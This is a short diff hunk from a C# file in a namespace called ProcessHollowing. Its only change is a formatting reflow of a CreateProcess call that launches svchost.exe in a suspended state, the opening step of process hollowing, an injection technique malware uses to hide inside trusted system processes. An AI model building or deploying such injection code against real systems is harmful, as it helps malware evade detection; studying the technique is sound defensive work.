@@ -97,8 +97,7 @@ namespace ProcessHollowing
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
-            IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
             PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
